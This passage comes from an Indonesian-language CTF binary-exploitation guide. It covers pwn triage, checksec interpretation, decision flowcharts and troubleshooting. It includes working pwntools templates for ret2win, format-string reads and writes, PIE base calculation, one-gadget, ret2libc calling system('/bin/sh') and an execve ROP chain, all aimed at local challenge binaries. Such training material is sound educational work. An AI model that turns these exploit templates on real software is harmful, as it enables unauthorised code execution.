    
- Ada function pointer/GOT/global variable yang bisa ditarget.
    
- Address target dapat diketahui.
    

**Workflow Cepat:**

```text
Step 1 → identifikasi format string
Step 2 → cari stack offset
Step 3 → identifikasi write target
Step 4 → tentukan desired value
Step 5 → gunakan format-string write primitive
Step 6 → verifikasi memory
```

**Command Kunci:**

```bash
# Periksa apakah binary memiliki full RELRO.
checksec --file=./challenge

# Lihat GOT.
objdump -R ./challenge

# Cari entry printf.
objdump -R ./challenge | grep printf
```

**Python Solver Template:**

```python
#!/usr/bin/env python3

from pwn import *

# Load target.
BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)

context.binary = elf

# Local process.
io = process(BINARY)

# Contoh target address.
# Gunakan address hasil analisis challenge.
TARGET = elf.got["puts"]

# Contoh payload format-string.
# Offset 6 hanyalah contoh; wajib diverifikasi.
OFFSET = 6

payload = fmtstr_payload(
    OFFSET,
    {
        TARGET: elf.symbols.get("win", 0)
    }
)

io.sendline(payload)
io.interactive()
```

> `fmtstr_payload()` sangat membantu, tetapi **stack offset dan write target tetap harus ditentukan dari challenge**.

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 20–60 menit

---

## 🎯 Pola PWN-8: PIE + ASLR Bypass via Leak

**Trigger/Sinyal:**

- PIE ON.
    
- ASLR aktif.
    
- Address binary berubah setiap execution.
    
- Tersedia information leak.
    
- Leak menunjukkan pointer ke binary/libc/stack.
    

**Workflow Cepat:**

```text
Step 1 → cari leak
Step 2 → klasifikasikan address
Step 3 → hitung base address
Step 4 → reconstruct absolute address
Step 5 → exploit menggunakan address hasil kalkulasi
```

### Rumus

Untuk PIE:

```text
PIE Base = Leaked Address - Known Symbol Offset
```

Contoh:

```text
Leaked main = 0x5555555552a0
main offset = 0x12a0

PIE base = 0x555555554000
```

**Python Template:**

```python
#!/usr/bin/env python3

from pwn import *

# Address leak dari challenge.
LEAKED_MAIN = 0x5555555552a0

# Offset symbol main dari ELF.
MAIN_OFFSET = 0x12a0

# Hitung PIE base.
PIE_BASE = LEAKED_MAIN - MAIN_OFFSET

# Verifikasi hasil.
log.info(f"PIE base: {hex(PIE_BASE)}")
```

**Referensi:** → [**File 50: ROP Chain**](https://arena.ai/c/<a href="/docs/rop-chain" class="text-[#00b4d8] hover:underline font-mono font-semibold">50_rop_chain_workflow.md</a>)

**Waktu Estimasi:** 15–45 menit

---

## 🪣 Pola PWN-9: Heap Use-After-Free Basic

**Trigger/Sinyal:**

- Program memanggil `malloc()`.
    
- Program memanggil `free()`.
    
- Pointer masih digunakan setelah `free()`.
    
- Ada menu:  
    `add`  
    `delete`  
    `edit`  
    `show`
    
- Object/chunk dapat diakses kembali setelah free.
    

**Workflow Cepat:**

```text
Step 1 → map heap lifecycle
Step 2 → cari malloc
Step 3 → cari free
Step 4 → cari use-after-free
Step 5 → pahami allocator behavior
Step 6 → bangun primitive leak/corruption
```

**Command Kunci:**

```bash
# Cari penggunaan malloc/free.
objdump -d ./challenge | grep -Ei "malloc|free|calloc|realloc"

# Periksa proteksi.
checksec --file=./challenge
```

**GDB Inspection:**

```bash
# Jalankan GDB pada binary.
gdb ./challenge

# Setelah berhenti pada fungsi relevan,
# periksa heap/chunk menggunakan perintah pwndbg jika tersedia.
```

**Mental Model:**

```text
malloc()
   ↓
pointer A
   ↓
free(A)
   ↓
pointer masih tersimpan
   ↓
use(A)
   ↓
UAF
```

**Referensi:** → [**File 49: Buffer Overflow**](https://arena.ai/c/<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>)

**Waktu Estimasi:** 30–120 menit

---

## 🧨 Pola PWN-10: One Gadget

**Trigger/Sinyal:**

- libc version diketahui.
    
- libc base dapat diperoleh.
    
- Ada one-gadget candidate.
    
- Constraint gadget dapat dipenuhi.
    
- Ada primitive overwrite seperti return address/GOT/function pointer.
    

**Workflow Cepat:**

```text
Step 1 → dapatkan libc leak
Step 2 → hitung libc base
Step 3 → cari one-gadget
Step 4 → baca constraints
Step 5 → penuhi constraints
Step 6 → overwrite control-flow
```

**Command Kunci:**

```bash
# Cari kandidat one-gadget dari libc challenge.
one_gadget ./libc.so.6
```

**Python Template:**

```python
#!/usr/bin/env python3

from pwn import *

# Load challenge dan libc.
BINARY = "./challenge"
LIBC = "./libc.so.6"

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

context.binary = elf

# Leak yang diperoleh dari tahap sebelumnya.
LEAKED_LIBC_SYMBOL = 0x7ffff7dd18b0

# Hitung base libc.
libc.address = LEAKED_LIBC_SYMBOL - libc.symbols["puts"]

# Contoh offset one-gadget hasil `one_gadget`.
ONE_GADGET_OFFSET = 0x4f322

# Hitung absolute address.
ONE_GADGET = libc.address + ONE_GADGET_OFFSET

log.info(f"libc base   = {hex(libc.address)}")
log.info(f"one gadget  = {hex(ONE_GADGET)}")
```

> One-gadget **bukan otomatis berhasil**. Constraint register/stack/environment tetap harus terpenuhi.

**Referensi:** → [**File 50: ROP Chain**](https://arena.ai/c/<a href="/docs/rop-chain" class="text-[#00b4d8] hover:underline font-mono font-semibold">50_rop_chain_workflow.md</a>)

**Waktu Estimasi:** 20–60 menit

---

# ⏱️ BAGIAN 3 — TRIAGE FRAMEWORK 5 MENIT

> ⭐ **Ini adalah bagian terpenting dari File 52.**

Tujuan triage:

```text
UNKNOWN BINARY
      ↓
   5 MINUTES
      ↓
KNOWN PATTERN
      ↓
KNOWN WORKFLOW
```

---

## 3.1 🔍 Checklist Triage Universal

### STEP 1 — File Identification — ±30 detik

```bash
# Cek architecture, format ELF, dan stripped status.
file ./challenge

# Cek proteksi binary.
checksec ./challenge
# Catatan: Sintaks `checksec ./challenge` dan `checksec --file=./challenge` ekuivalen.

# Jika checksec belum terpasang di Parrot OS:
# sudo apt update && sudo apt install checksec -y
# atau via pip: pip3 install checksec.py
```

Checklist:

```text
[ ] 32-bit / 64-bit sudah dicatat
[ ] PIE sudah dicatat
[ ] NX sudah dicatat
[ ] Canary sudah dicatat
[ ] RELRO sudah dicatat
[ ] Stripped / not stripped sudah dicatat
```

---

## STEP 2 — String Hunt — ±1 menit

```bash
# Cari string menarik terkait flag, password, shell, dan win.
strings -n 6 ./challenge | grep -Ei "flag|win|shell|pass|get_flag"

# Cek apakah binary kemungkinan packed dengan UPX.
strings ./challenge | grep -Ei "UPX|packed"

# Cari format specifier yang berpotensi relevan.
strings ./challenge | grep -E "%[0-9$]*[pxsnd]"
```

Checklist:

```text
[ ] ada flag?
[ ] ada win() hint?
[ ] ada shell?
[ ] ada password?
[ ] ada UPX?
[ ] ada format string?
```

---

## STEP 3 — Dynamic Triage — ±1 menit

```bash
# Coba lihat dynamic library calls.
# Berguna terutama untuk dynamically linked binary.
ltrace ./challenge <<< "AAAA"

# Lihat syscall behavior.
strace ./challenge <<< "AAAA"
```

Cari:

```text
strcmp()
strncmp()
memcmp()
puts()
printf()
malloc()
free()
open()
read()
ptrace()
```

Checklist:

```text
[ ] strcmp/memcmp ditemukan?
[ ] printf ditemukan?
[ ] ptrace ditemukan?
[ ] file dibuka?
[ ] malloc/free terlihat?
```

> **Catatan:** `ltrace` bukan oracle. Static linking, symbol visibility, anti-debug, atau behavior tertentu dapat membuat hasilnya tidak lengkap.

---

## STEP 4 — Vulnerability Surface — ±2 menit

Cari sink input:

```bash
# Cari common input functions pada symbol/disassembly.
objdump -d ./challenge | grep -Ei \
"gets|strcpy|strncpy|memcpy|scanf|read|printf|sprintf|snprintf"
```

Cari fungsi menarik:

```bash
# Cari simbol dengan nama umum pada binary yang tidak stripped.
nm ./challenge 2>/dev/null | grep -Ei \
"win|flag|shell|main|auth|check"
```

Pertanyaan:

```text
[ ] Ada gets()?
[ ] Ada strcpy()?
[ ] Ada read()?
[ ] Ada scanf("%s")?
[ ] Ada printf(user_input)?
[ ] Ada malloc/free?
[ ] Ada win()?
[ ] Ada XOR loop?
[ ] Ada hash?
[ ] Ada ptrace()?
```

---

## STEP 5 — Kategori Decision

Gunakan rule sederhana:

```text
Ada strcmp/memcmp?
        ↓
     RE pattern

Ada XOR loop?
        ↓
     RE pattern

Ada gets/read/strcpy?
        ↓
     Stack PWN

Ada printf(user_input)?
        ↓
     Format String

Ada malloc/free + stale pointer?
        ↓
     Heap/UAF

NX ON + RIP control?
        ↓
     ROP/ret2libc

PIE ON + leak?
        ↓
     PIE/ASLR bypass
```

---

# 📊 3.2 Decision Matrix

|Hasil Checksec|Temuan|Pola|Workflow|
|---|---|---|---|
|No Canary, NX OFF|`gets()`|PWN-2/PWN-3|File 49|
|No Canary, NX OFF|`win()`|PWN-1|File 49|
|No Canary, NX OFF|Shellcode target|PWN-3|File 49|
|No Canary, NX ON|`gets()`|PWN-2 → PWN-4/PWN-5|File 49 + 50|
|No Canary, NX ON|ROP gadgets|PWN-5|File 50|
|No Canary, NX ON|libc leak|PWN-4|File 49|
|Canary ON, NX ON|Format string|PWN-6/PWN-7|File 49|
|Canary ON, NX ON|Stack leak|PWN-8 / leak-first|File 49 + 50|
|PIE OFF, NX ON|RIP controlled|PWN-4/PWN-5|File 49 + 50|
|PIE ON, ASLR ON|Code leak|PWN-8|File 50|
|Full RELRO|Format string|PWN-6|File 49|
|Partial RELRO|GOT target|PWN-7|File 49|
|Full RELRO|RIP control|ROP/ret2libc|File 49 + 50|
|Stripped|No useful symbols|RE-9|File 51|
|Dynamic + strcmp|Constant target|RE-1|File 51|
|XOR loop|Constant key|RE-2|File 51|
|XOR + modulo|Repeating key|RE-3|File 51|
|UPX signature|Packed ELF|RE-8|File 51|
|`ptrace()`|GDB behavior changes|RE-7|File 51|
|Hash import|Digest comparison|RE-5|File 51|
|malloc/free|Stale pointer|PWN-9|File 49/50|
|libc known + leak|One-gadget candidate|PWN-10|File 50|

### 🧠 Interpretasi Checksec

```text
NX OFF
  ↓
Code injection mungkin tersedia
  ↓
PWN-3 candidate
```

```text
NX ON
  ↓
Tidak bisa menjalankan stack shellcode secara langsung
  ↓
ROP / ret2libc candidate
```

```text
PIE ON
  ↓
Binary base random
  ↓
Butuh address leak atau strategi lain
```

```text
Canary ON
  ↓
Stack overwrite harus mempertimbangkan canary
  ↓
Cari leak / bypass / primitive lain
```

```text
Full RELRO
  ↓
GOT overwrite biasanya bukan jalur utama
  ↓
Pertimbangkan RIP/ROP/logic/other primitive
```

---

# 🧰 BAGIAN 4 — PWNTOOLS BOILERPLATE TEMPLATES

## 4.1 🧱 Template Universal CTF PWN

```python
#!/usr/bin/env python3

from pwn import *
import os

# ============================================================
# CONFIGURATION
# ============================================================

BINARY = "./challenge"
LIBC = "./libc.so.6"

HOST = "example.com"
PORT = 1337

# ============================================================
# ELF / CONTEXT
# ============================================================

# Load target ELF.
elf = ELF(BINARY, checksec=False)

# Load libc only if file exists.
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None

# Set pwntools context berdasarkan architecture binary.
context.binary = elf

# Use "debug" while troubleshooting.
context.log_level = "info"

# ============================================================
# CONNECTION
# ============================================================

def start():
    # Use REMOTE=1 for remote challenge.
    if args.REMOTE:
        return remote(HOST, PORT)

    # Default: local process.
    return process(BINARY)


io = start()

# ============================================================
# EXPLOIT CODE
# ============================================================

# Example:
# payload = b"A" * OFFSET
# io.sendline(payload)

# ============================================================
# INTERACTIVE
# ============================================================

io.interactive()
```

Run:

```bash
# Jalankan secara lokal.
python3 exploit.py

# Jalankan dalam mode debug.
python3 exploit.py DEBUG

# Jalankan ke remote.
python3 exploit.py REMOTE
```

---

# 🏆 4.2 Template ret2win

```python
#!/usr/bin/env python3

from pwn import *

# Load binary.
BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)
context.binary = elf

# Start local.
io = process(BINARY)

# ============================================================
# WIN ADDRESS
# ============================================================

# Jika symbol win() masih tersedia.
if "win" in elf.symbols:
    WIN = elf.symbols["win"]
else:
    # Jika stripped, isi dengan address yang diperoleh Ghidra.
    WIN = 0x401196

# ============================================================
# OFFSET
# ============================================================

# Offset hasil cyclic_find().
OFFSET = 40

# ============================================================
# PAYLOAD
# ============================================================

payload = flat(
    # Fill sampai saved return address.
    b"A" * OFFSET,

    # Redirect execution ke win().
    p64(WIN)
)

# Kirim payload.
io.sendlineafter(b":", payload)

# Interaktif.
io.interactive()
```

### Mencari offset

```python
#!/usr/bin/env python3

from pwn import *

# Buat De Bruijn pattern.
payload = cyclic(200)

# Cetak payload untuk digunakan pada challenge.
print(payload)
```

Setelah crash:

```python
#!/usr/bin/env python3

from pwn import *

# Nilai RIP/RSP yang terbaca dari debugger.
CRASH_VALUE = 0x6161616a

# Cari posisi nilai tersebut pada pattern.
offset = cyclic_find(CRASH_VALUE)

print(f"Offset = {offset}")
```

> Untuk x86-64, pastikan value yang dipakai sesuai representasi byte yang benar. `cyclic_find()` tidak boleh dipakai secara membabi buta pada integer yang sudah terpotong.

---

# 📚 4.3 Template ret2libc Tanpa PIE

```python
#!/usr/bin/env python3

from pwn import *

# ============================================================
# CONFIG
# ============================================================

BINARY = "./challenge"
LIBC = "./libc.so.6"

# ============================================================
# SETUP
# ============================================================

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

context.binary = elf

# ============================================================
# START
# ============================================================

io = process(BINARY)

# ============================================================
# OFFSET
# ============================================================

OFFSET = 40

# ============================================================
# ROP
# ============================================================

rop = ROP(elf)

# Gadget untuk set RDI.
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address

# ret gadget untuk alignment.
RET = rop.find_gadget(["ret"]).address

# ============================================================
# LIBC LEAK STAGE
# ============================================================

# Di sini exploit harus menghasilkan leak.
# Misalnya leak = puts(puts@got), lalu kembali ke main.
#
# Leak sebenarnya harus diperoleh dari challenge.
# Placeholder sengaja dibiarkan sebagai nilai hasil stage 1.

LEAKED_PUTS = 0x7ffff7dd18b0

# ============================================================
# CALCULATE LIBC BASE
# ============================================================

libc.address = LEAKED_PUTS - libc.symbols["puts"]

SYSTEM = libc.symbols["system"]
BIN_SH = next(libc.search(b"/bin/sh\x00"))

# ============================================================
# SECOND-STAGE PAYLOAD
# ============================================================

payload = flat(
    # Reach RIP.
    b"A" * OFFSET,

    # Stack alignment.
    RET,

    # system("/bin/sh")
    POP_RDI,
    BIN_SH,
    SYSTEM
)

io.sendline(payload)

# ============================================================
# SHELL
# ============================================================

io.interactive()
```

### 🔄 Ret2libc dua tahap

```text
STAGE 1
────────────────────────

Input
  ↓
RIP control
  ↓
ROP
  ↓
puts(puts@GOT)
  ↓
Leak libc
  ↓
return main


STAGE 2
────────────────────────

Leak
  ↓
libc base
  ↓
system()
  +
"/bin/sh"
  ↓
Shell
```

---

# 🔍 4.4 Template Format String Read

```python
#!/usr/bin/env python3

from pwn import *

# Load binary.
BINARY = "./challenge"

elf = ELF(BINARY, checksec=False)
context.binary = elf

# Start process.
io = process(BINARY)

# ============================================================
# DISCOVERY PAYLOAD
# ============================================================

# Print several stack arguments.
payload = (
    b"%1$p."
    b"%2$p."
    b"%3$p."
    b"%4$p."
    b"%5$p."
    b"%6$p."
    b"%7$p."
    b"%8$p."
)

# Send input.
io.sendline(payload)

# Receive result.
output = io.recvall(timeout=2)

# Print result.
print(output.decode(errors="replace"))
```

### Tujuan

Mencari:

```text
0x7fff... → stack
0x7ffff7... → libc
0x5555... → PIE
0x00... → NULL / invalid
```

Jangan langsung menganggap address berdasarkan prefix saja. Konfirmasi dengan memory map atau known offsets.

---

# ⚙️ 4.5 Template ROP Syscall `execve`

Untuk challenge yang menyediakan gadget yang sesuai:

```python
#!/usr/bin/env python3

from pwn import *

# Load target.
BINARY = "./challenge"

elf = ELF(BINARY, checksec=False)
context.binary = elf

# Start process.
io = process(BINARY)

# Create ROP helper.
rop = ROP(elf)

# ============================================================
# GADGET DISCOVERY
# ============================================================

# Cari pop gadgets.
try:
    POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
    POP_RSI = rop.find_gadget(["pop rsi", "ret"]).address
    POP_RDX = rop.find_gadget(["pop rdx", "ret"]).address
except:
    log.failure("Required register gadgets were not found.")
    raise

# ============================================================
# TARGET
# ============================================================

# Gunakan string /bin/sh yang tersedia.
BIN_SH = next(elf.search(b"/bin/sh\x00"))

# Offset hasil cyclic.
OFFSET = 40

# Syscall number execve pada x86-64 Linux.
SYS_EXECVE = 59

# Jika challenge menyediakan gadget `pop rax; ret`.
POP_RAX = rop.find_gadget(["pop rax", "ret"]).address

# Cari syscall; ret jika tersedia.
SYSCALL = None

for gadget in rop.gadgets.values():
    insns = gadget.insns

    # Cari kombinasi sederhana.
    if insns[-1] == "syscall":
        SYSCALL = gadget.address
        break

if SYSCALL is None:
    log.warning("No obvious syscall gadget found.")

# ============================================================
# PAYLOAD
# ============================================================

payload = flat(
    b"A" * OFFSET,

    # rax = 59 = execve
    POP_RAX,
    SYS_EXECVE,

    # rdi = "/bin/sh"
    POP_RDI,
    BIN_SH,

    # rsi = NULL
    POP_RSI,
    0,

    # rdx = NULL
    POP_RDX,
    0,

    # syscall
    SYSCALL
)

io.sendline(payload)
io.interactive()
```

> Ketersediaan gadget berbeda antar binary. Jangan menganggap setiap binary memiliki kombinasi gadget lengkap.

---

# 🧨 4.6 Template One Gadget

```python
#!/usr/bin/env python3

from pwn import *

# Load target and libc.
BINARY = "./challenge"
LIBC = "./libc.so.6"

elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

context.binary = elf

# Start local process.
io = process(BINARY)

# ============================================================
# LIBC BASE
# ============================================================

# Leak yang diperoleh pada tahap sebelumnya.
LEAKED_SYMBOL = 0x7ffff7dd18b0

# Tentukan symbol leak.
LEAKED_SYMBOL_OFFSET = libc.symbols["puts"]

# Hitung base.
libc.address = LEAKED_SYMBOL - LEAKED_SYMBOL_OFFSET

# ============================================================
# ONE GADGET
# ============================================================

# Ganti dengan offset kandidat hasil `one_gadget`.
ONE_GADGET_OFFSET = 0x4f322

# Absolute address.
ONE_GADGET = libc.address + ONE_GADGET_OFFSET

# ============================================================
# FINAL PAYLOAD
# ============================================================

OFFSET = 40

payload = flat(
    b"A" * OFFSET,
    ONE_GADGET
)

io.sendline(payload)

io.interactive()
```

---

# 🐛 BAGIAN 5 — DEBUGGING PWNTOOLS

## 5.1 🌍 Perbedaan Behavior Local vs Remote

Exploit:

```text
LOCAL → BERHASIL
REMOTE → GAGAL
```

tidak otomatis berarti payload salah.

Kemungkinan penyebab:

```text
1. libc berbeda
2. binary berbeda
3. ASLR berbeda
4. address leak berbeda
5. offset berbeda
6. timeout
7. stack alignment
8. remote service punya input/output berbeda
9. environment berbeda
10. mitigation berbeda
```

### Contoh

Local:

```text
glibc 2.35
```

Remote:

```text
glibc 2.31
```

Maka:

```text
system offset       berbeda
/bin/sh offset      berbeda
one-gadget offset   berbeda
```

Karena itu exploit berdasarkan hardcoded libc address bisa gagal total.

---

# 🐞 5.2 Debug dengan GDB dari Pwntools

```python
#!/usr/bin/env python3

from pwn import *

# Target binary.
BINARY = "./challenge"

elf = ELF(BINARY, checksec=False)
context.binary = elf

# Jalankan GDB dengan breakpoint di main.
io = gdb.debug(
    BINARY,
    """
    # Berhenti di main.
    break main

    # Lanjutkan execution.
    continue
    """
)

# Setelah debugger attach,
# exploit dapat dilanjutkan.
io.interactive()
```

Jalankan:

```bash
# Jalankan exploit dengan debugger.
python3 exploit.py
```

---

# 🎯 5.3 Cara Cari Offset yang Tepat

## Metode A — Cyclic Pattern

```python
#!/usr/bin/env python3

from pwn import *

# Generate pattern 300 byte.
pattern = cyclic(300)

# Print pattern.
print(pattern)
```

Setelah crash:

```python
#!/usr/bin/env python3

from pwn import *

# Contoh nilai kontrol register dari crash.
crash = 0x6161616c

# Cari offset.
offset = cyclic_find(crash)

print(offset)
```

---

## Metode B — Manual De Bruijn Pattern

Pwntools `cyclic()` pada dasarnya menggunakan De Bruijn sequence untuk menghasilkan subsequence unik.

Keuntungannya:

```text
tidak perlu menebak:
20
24
32
40
48
56
...
```

Anda cukup mencari posisi sequence yang masuk ke register.

---

## Metode C — Pwndbg

Saat crash:

```text
pwndbg>
```

Gunakan:

```text
telescope $rsp
```

atau:

```text
info registers
```

Fokus:

```text
RIP
RSP
RBP
```

Mental model:

```text
RIP = "Saya menjalankan apa?"
RSP = "Stack sekarang berada di mana?"
RBP = "Frame stack saya di mana?"
```

---

# 🚨 5.4 Common Pwntools Errors

|Error|Penyebab|Solusi|
|---|---|---|
|`NameError: name 'ELF' is not defined`|Import pwntools salah|`from pwn import *`|
|`FileNotFoundError`|Binary path salah|Periksa `BINARY`|
|`EOFError`|Process exit sebelum receive|Periksa payload dan timing|
|`Could not find PLT entry`|Symbol tidak tersedia|Gunakan Ghidra/readelf|
|`Could not resolve`|Symbol/Gadget tidak ada|Cari manual|
|`Timeout`|Program menunggu input lain|Gunakan `sendlineafter()`|
|`PwnlibException`|Argumen pwntools tidak valid|Baca traceback|
|`cyclic_find()` salah|Value endian/length salah|Periksa bytes crash|
|`ELF` load warning|Binary malformed/arsitektur|Cek `file`|
|`ROP()` tidak menemukan gadget|Gadget memang tidak ada|Cari binary/libc lain|

---

# 🔀 BAGIAN 6 — PATTERN IDENTIFICATION FLOWCHART

## 6.1 🧠 Flowchart RE Challenges

```text
                    ┌─────────────────────────┐
                    │ Terima Binary RE        │
                    └────────────┬────────────┘
                                 │
                                 v
                    ┌─────────────────────────┐
                    │ Triage: file + strings  │
                    │ + ltrace                │
                    └────────────┬────────────┘
                                 │
                                 v
                      ┌─────────────────────┐
                      │ Flag ditemukan?     │
                      └───────┬───────┬─────┘
                              │ YES   │ NO
                              v       v
                         ┌────────┐  ┌───────────────┐
                         │  FLAG  │  │ Buka Ghidra   │
                         └────────┘  └───────┬───────┘
                                             │
                                             v
                                ┌────────────────────────┐
                                │ Identifikasi pattern   │
                                └────────────┬───────────┘
                                             │
               ┌─────────────────────────────┼────────────────────────┐
               │                             │                        │
               v                             v                        v
          strcmp/memcmp                    XOR                    ptrace
               │                             │                        │
               v                             v                        v
             RE-1                     RE-2 / RE-3                  RE-7
               │                             │                        │
               └─────────────────────────────┼────────────────────────┘
                                             │
                                             v
                                  ┌────────────────────┐
                                  │ Execute Solver     │
                                  └─────────┬──────────┘
                                            │
                                            v
                                          FLAG
```

---

## 6.2 💥 Flowchart PWN Challenges

```text
                 ┌──────────────────────────────┐
                 │ Terima Binary PWN Challenge  │
                 └──────────────┬───────────────┘
                                │
                                v
                 ┌──────────────────────────────┐
                 │ file + checksec              │
                 └──────────────┬───────────────┘
                                │
                                v
                 ┌──────────────────────────────┐
                 │ Identifikasi Input Point     │
                 │ gets/read/scanf/printf       │
                 └──────────────┬───────────────┘
                                │
            ┌───────────────────┼───────────────────────┐
            │                   │                       │
            v                   v                       v
          win()?             NX OFF                  printf()
            │                   │                       │
            v                   v                       v
          PWN-1             Shellcode                FSB
                                │                       │
                                v                 ┌─────┴─────┐
                               PWN-3              │           │
                                                 Read       Write
                                                  │           │
                                                PWN-6       PWN-7

                     NX ON
                        │
                        v
              ┌─────────────────────┐
              │ RIP Controlled?     │
              └──────────┬──────────┘
                         │
                         v
                 ┌───────────────┐
                 │ ROP / ret2libc│
                 └──────┬────────┘
                        │
             ┌──────────┴─────────────┐
             │                        │
             v                        v
        libc leak?               PIE + leak?
             │                        │
             v                        v
         PWN-4                    PWN-8
             │
             v
         PWN-5 ROP
             │
             v
         PWN-10
       One Gadget
```

---

# 📝 BAGIAN 7 — MINI CTF WRITEUP TEMPLATES

## 7.1 🔬 Template Catatan RE Challenge

```text
CHALLENGE: __________________________
PLATFORM: ___________________________

TRIAGE:
- Architecture: _____________________
- Stripped: YES / NO
- Packed: YES / NO
- Dynamically Linked: YES / NO
- ltrace output: ____________________
- Interesting strings: ______________

POLA TERIDENTIFIKASI:
_____________________________________

TOOLS YANG DIPAKAI:
1. __________________________________
2. __________________________________
3. __________________________________

LANGKAH SOLVE:

1. __________________________________
2. __________________________________
3. __________________________________
4. __________________________________
5. __________________________________

SOLVER:
_____________________________________

FLAG:
_____________________________________

WAKTU:
_____ menit

PELAJARAN:
_____________________________________

PATTERN BARU:
_____________________________________
```

---

## 7.2 💣 Template Catatan PWN Challenge

```text
CHALLENGE: __________________________
PLATFORM: ___________________________

BINARY:
- Architecture: _____________________
- PIE: ON / OFF
- NX: ON / OFF
- Canary: ON / OFF
- RELRO: ____________________________
- Stripped: YES / NO

VULNERABILITY:
_____________________________________

INPUT SINK:
_____________________________________

POLA:
_____________________________________

OFFSET:
_____________________________________

LEAK:
- Type: _____________________________
- Address: _________________________
- Base: ____________________________

TARGET:
_____________________________________

TECHNIQUE:
[ ] ret2win
[ ] Stack BOF
[ ] Shellcode
[ ] ret2libc
[ ] ROP
[ ] Format String Read
[ ] Format String Write
[ ] PIE/ASLR Bypass
[ ] UAF
[ ] One Gadget

PAYLOAD STAGE:

STAGE 1:
_____________________________________

STAGE 2:
_____________________________________

FLAG:
_____________________________________

WAKTU:
_____ menit

FAILED ATTEMPTS:
1. __________________________________
2. __________________________________

ROOT CAUSE:
[ ] Offset
[ ] Alignment
[ ] Libc
[ ] Address leak
[ ] Canary
[ ] PIE
[ ] ASLR
[ ] RELRO
[ ] Timing
[ ] Input handling

PELAJARAN:
_____________________________________
```

---

# 🔧 BAGIAN 8 — COMMON ERRORS & TROUBLESHOOTING

|No|Error / Gejala|Penyebab|Solusi|
|--:|---|---|---|
|1|Segfault setelah RIP overwrite|Alamat tujuan salah|Periksa address dan offset|
|2|`EOFError: EOF occurred...`|Process terminate sebelum receive|Periksa payload, prompt, dan crash|
|3|Exploit jalan di GDB tapi gagal normal|Timing/ASLR/environment berbeda|Uji tanpa GDB dan cek address|
|4|`Bad address` saat overwrite GOT|Address invalid/protection|Cek RELRO dan target address|
|5|Off-by-8|Stack alignment salah|Tambahkan `ret` gadget jika diperlukan|
|6|Libc function tidak ditemukan|Libc version/symbol mismatch|Gunakan libc challenge yang benar|
|7|`cyclic_find()` mengembalikan `None`|Value bukan bagian pattern / endian salah|Ambil bytes register dengan benar|
|8|`Permission denied`|File tidak executable|Gunakan `chmod +x ./challenge`|
|9|Format string tidak menghasilkan output|Prompt/format handling salah|Cek input path dan positional index|
|10|ASLR bypass gagal|Leak salah|Verifikasi jenis leak dan offset|
|11|ROP crash sebelum target|Gadget chain tidak benar|Cek setiap return address|
|12|`movaps` crash dalam libc|Stack misaligned|Tambahkan `ret`|
|13|Shell tidak muncul|`/bin/sh` atau register salah|Cek RDI dan target function|
|14|`system()` address salah|libc base salah|Hitung ulang dari leak|
|15|Leak terlihat `0x7fff...` tapi exploit gagal|Leak belum tentu pointer yang dibutuhkan|Identifikasi ownership address|
|16|`Could not find gadget`|Gadget tidak tersedia|Cari gadget di libc atau binary lain|
|17|Payload dipotong|Null/newline/input restriction|Sesuaikan primitive dan encoder|
|18|Offset benar tetapi crash tetap|Alignment/protection issue|Pisahkan offset vs alignment vs mitigation|
|19|Remote beda dengan local|libc/environment berbeda|Identifikasi remote libc|
|20|`sendlineafter()` hang|Prompt tidak sama|Gunakan `recvuntil()`/`sendline()` sesuai behavior|
|21|Canary berubah setiap run|ASLR/randomization|Dapatkan leak atau bypass|
|22|PIE address berubah|PIE + ASLR|Cari code pointer leak|
|23|GOT overwrite tidak bekerja|Full RELRO|Gunakan alternatif control-flow primitive|
|24|One-gadget tidak bekerja|Constraint tidak terpenuhi|Baca constraint one-gadget|
|25|UAF exploit tidak konsisten|Allocator state berbeda|Kontrol allocation/free sequence|
|26|GDB memperlihatkan address tertentu tetapi payload gagal|Breakpoint mengubah timing/state|Uji kembali execution normal|
|27|`recvline()` berhenti|Program tidak mengirim newline|Gunakan `recv()`/`recvall()`|
|28|`unpack()` error|Jumlah byte salah|Pastikan 4-byte vs 8-byte read|
|29|`p64()` menghasilkan payload salah|Target 32-bit|Gunakan `p32()`|
|30|Remote langsung close|Payload malformed|Validasi satu tahap demi satu tahap|

---

## 🧮 8.1 Stack Alignment — Kasus Penting

Pada System V AMD64 ABI, stack alignment tertentu harus dipertahankan ketika function dipanggil.

Kesalahan umum:

```text
offset benar
+
system() benar
=
masih crash
```

Penyebabnya bisa:

```text
STACK ALIGNMENT
```

### Contoh

Payload pertama:

```python
payload = flat(
    b"A" * OFFSET,
    POP_RDI,
    BIN_SH,
    SYSTEM
)
```

Masalah:

```text
RIP → POP_RDI
       ↓
RIP → SYSTEM
```

Stack alignment ketika masuk ke libc mungkin tidak sesuai kebutuhan instruksi tertentu.

Coba:

```python
payload = flat(
    b"A" * OFFSET,

    # Tambahkan return gadget untuk alignment.
    RET,

    # Set RDI.
    POP_RDI,
    BIN_SH,

    # Call system().
    SYSTEM
)
```

Mental model:

```text
BAD:

OFFSET
  ↓
POP RDI
  ↓
SYSTEM
  ↓
CRASH


POSSIBLE FIX:

OFFSET
  ↓
RET
  ↓
POP RDI
  ↓
SYSTEM
  ↓
/bin/sh
```

### Penting

Jangan menyimpulkan:

```text
"Payload salah."
```

sebelum membedakan:

```text
A. Offset salah
B. Address salah
C. Stack alignment salah
D. Libc salah
E. Canary belum bypass
F. PIE/ASLR belum bypass
G. RELRO menghalangi primitive
```

---

# ⚡ BAGIAN 9 — CHEATSHEET CEPAT

## 9.1 📄 Binary CTF Quick Reference

### 🔎 5 Command Triage Terpenting

```bash
# 1. Identifikasi binary.
file ./challenge

# 2. Checksec.
checksec --file=./challenge

# 3. Cari string penting.
strings -n 6 ./challenge | grep -Ei "flag|win|shell|pass"

# 4. Dynamic trace.
ltrace ./challenge <<< "AAAA"

# 5. Syscall trace.
strace ./challenge <<< "AAAA"
```

---

